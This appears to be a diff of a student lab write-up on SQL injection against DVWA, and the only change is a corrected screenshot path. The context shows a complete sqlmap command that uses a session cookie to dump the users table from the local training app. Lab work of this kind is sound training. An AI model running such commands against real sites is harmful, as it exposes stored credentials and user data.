@@ -200,7 +200,7 @@ Get users information
 python3 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=54euriaqv4lm5tvue6n4c7lou6; security=low" -D dvwa -T users --dump
 
 ```
-![task2.commandan2users](./Pictures/Task2/commandan2tables.png)
+![task2.commandan2users](./Pictures/Task2/commandan2users.png)
 
 Results
 ![task2.resultan2users](./Pictures/Task2/resultan2users.png)
